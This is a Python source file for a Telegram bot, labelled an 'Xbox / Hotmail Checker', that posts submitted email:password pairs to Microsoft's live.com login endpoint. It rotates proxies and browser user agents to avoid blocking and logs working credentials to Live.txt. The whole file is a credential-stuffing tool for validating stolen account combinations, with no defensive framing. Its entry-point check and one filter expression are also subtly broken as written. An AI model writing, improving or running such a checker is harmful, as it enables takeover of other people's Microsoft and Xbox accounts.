import os
import requests
import random
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ====================== RAILWAY VARIABLES ======================
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
USE_PROXIES = os.getenv("USE_PROXIES", "false").lower() == "true"

# ====================== PROXIES ======================
proxies_list = []
if USE_PROXIES and os.path.exists("proxies.txt"):
    with open("proxies.txt", "r", encoding="utf-8", errors="ignore") as f:
        proxies_list = [line.strip() for line in f if line.strip()]

def get_proxy():
    if not proxies_list:
        return None
    p = random.choice(proxies_list)
    return {"http": p, "https": p}

# ====================== CHECK FUNCTION ======================
def check_account(email: str, password: str):
    try:
        session = requests.Session()
        proxy = get_proxy()

        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
        }

        data = {
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "passwd": password,
            "ps": "2",
            "NewUser": "1",
            "fspost": "0",
            "i21": "0",
        }

        r = session.post("https://login.live.com/ppsecure/post.srf", 
                        data=data, 
                        headers=headers, 
                        proxies=proxy, 
                        timeout=20)

        if any(err in r.text.lower() for err in ["doesn't exist", "incorrect", "compte ou mot de passe", "incorrect password"]):
            with open("Dead.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{password} [DEAD]\n")
            return f"❌ DEAD → {email}"

        # LIVE
        with open("Live.txt", "a", encoding="utf-8") as f:
            f.write(f"{email}:{password} | {datetime.now().strftime('%Y-%m-%d %H:%M')}\n")
        
        return f"✅ LIVE → {email}"

    except Exception as e:
        return f"⚠️ ERROR → {email} | {str(e)[:60]}"

# ====================== TELEGRAM COMMANDS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Access Denied.")
        return
    await update.message.reply_text("🤖 Xbox / Hotmail Checker Bot Ready\n\nSend: email:password")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Access Denied.")
        return

    text = update.message.text.strip()
    if ":" not in text:
        await update.message.reply_text("❌ Format: email:password")
        return

    email, password = [x.strip() for x in text.split(":", 1)]
    
    await update.message.reply_text(f"🔄 Checking → {email}...")
    result = check_account(email, password)
    await update.message.reply_text(result)

# ====================== RUN BOT ======================
if name == "main":
    print("🚀 Bot Started...")
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))

    app.run_polling()
